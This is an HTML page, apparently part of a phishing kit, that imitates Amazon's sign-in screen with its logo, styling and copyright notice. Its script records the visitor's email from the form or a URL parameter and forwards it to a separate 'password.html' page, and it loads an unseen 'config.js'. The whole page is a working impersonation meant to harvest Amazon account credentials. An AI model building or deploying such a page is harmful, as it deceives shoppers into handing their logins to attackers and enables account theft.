<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Amazon Ember', Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        .logo {
            margin: 10px 0 20px;
        }
        .logo img {
            height: 30px;
        }
        .kotak {
            width: 100%;
            max-width: 340px;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 20px 26px;
            background: #fff;
        }
        h1 {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 10px;
        }
        .sub-judul {
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
        }
        label {
            font-size: 13px;
            font-weight: 700;
            margin-bottom: 7px;
            display: block;
        }
        input {
            width: 100%;
            padding: 7px 10px;
            border: 1px solid #a6a6a6;
            border-radius: 4px;
            font-size: 15px;
            margin-bottom: 15px;
            height: 32px;
        }
        input:focus {
            border-color: #007185;
            outline: none;
            box-shadow: 0 0 0 1px #007185;
        }
        button {
            width: 100%;
            padding: 7px 10px;
            background: linear-gradient(to bottom, #f7df74, #ecc000);
            border: 1px solid #b88600;
            border-radius: 4px;
            font-size: 15px;
            cursor: pointer;
            margin-bottom: 20px;
            height: 32px;
        }
        button:hover {
            background: linear-gradient(to bottom, #f5d648, #d4a300);
        }
        .teks-bawah {
            font-size: 12px;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        .teks-bawah a {
            color: #0066c0;
            text-decoration: none;
        }
        .teks-bawah a:hover {
            text-decoration: underline;
        }
        .garis {
            border-bottom: 1px solid #e7e7e7;
            margin-bottom: 20px;
        }
        .bantuan {
            font-size: 13px;
            margin-bottom: 30px;
        }
        .bantuan a {
            color: #0066c0;
            text-decoration: none;
        }
        .bantuan a:hover {
            text-decoration: underline;
        }
        .akun-baru {
            text-align: center;
        }
        .akun-baru span {
            display: inline-block;
            font-size: 12px;
            color: #555;
            position: relative;
            top: -8px;
            padding: 0 8px;
            background: #fff;
        }
        .tombol-baru {
            background: linear-gradient(to bottom, #f6f7f9, #e9ecef);
            border: 1px solid #adb1b8;
            color: #111;
            margin-top: 0;
        }
        .tombol-baru:hover {
            background: linear-gradient(to bottom, #e9ecef, #d9dde0);
        }
        .footer {
            margin-top: 40px;
            font-size: 11px;
            color: #555;
            text-align: center;
        }
        .footer a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer p {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="img/amazonlogo.png" alt="Amazon">
    </div>

    <div class="kotak">
        <h1>Sign in</h1>
        <p class="sub-judul">or create account</p>

        <label for="email">Enter mobile number or email</label>
        <input type="text" id="email" name="email" required>

        <button onclick="lanjutKeSandi()">Continue</button>

        <p class="teks-bawah">
            By continuing, you agree to Amazon's 
            <a href="#">Conditions of Use</a> and 
            <a href="#">Privacy Notice</a>.
        </p>

        <div class="garis"></div>

        <p class="bantuan">
            <a href="#">Need help?</a>
        </p>
    </div>

    <div class="akun-baru">
        <div style="border-bottom: 1px solid #ddd; margin: 25px 0; position: relative;">
            <span>New to Amazon?</span>
        </div>
        <button class="tombol-baru" onclick="window.location.href='#'">Create your Amazon account</button>
    </div>

    <div class="footer">
        <p>
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </p>
        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script src="config.js"></script>
<script>
window.onload = function() {
    const params = new URLSearchParams(window.location.search);
    const email = params.get("anrew");
    if(email && email.includes("@")) {
        localStorage.setItem("dataEmail", email);
        window.location.href = `password.html?anrew=${encodeURIComponent(email)}`;
    }
};

function lanjutKeSandi() {
    const email = document.getElementById("email").value.trim();
    if(!email) {
        alert("Masukkan nomor ponsel atau email Anda");
        return;
    }
    localStorage.setItem("dataEmail", email);
    window.location.href = `password.html?anrew=${encodeURIComponent(email)}`;
}
</script>
</body>
</html>
